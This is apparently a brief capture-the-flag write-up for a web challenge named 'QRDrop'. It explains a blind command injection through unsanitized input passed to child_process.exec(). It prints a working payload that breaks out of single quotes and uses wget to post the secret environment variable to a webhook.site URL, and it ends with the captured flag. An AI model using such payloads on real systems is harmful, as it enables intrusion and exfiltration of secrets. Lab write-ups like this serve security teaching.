QRDrop:  the website generate a qrcode with anything you pass. But, there is a problem in the code: The application takes your url input and drops it directly into a shell string passed to child_process.exec(). While the developer tried to secure it by wrapping ${url} in single quotes ('), they failed to sanitize the input.  so, sending first ‘ and then your command, it might be able to execute it. but, it won’t display you anything: Inside the exec callback, if there is an error, the server just returns a generic string ('Could not generate QR code...'). It never returns stdout or stderr. This means you cannot see the output of your commands on the webpage.  so, you need to use web hook to receive the flag. Be careful, curl doesn’t work, you need to use wget:  '; wget --post-data="$FLAG" https://webhook.site/a1cad362-6966-478e-954e-f89bc182a46c; #  on the web hook page you will see the flag: offsec{qr_dr0p_qu0t3_br34k_hVWqJm8c5okCFUyI}
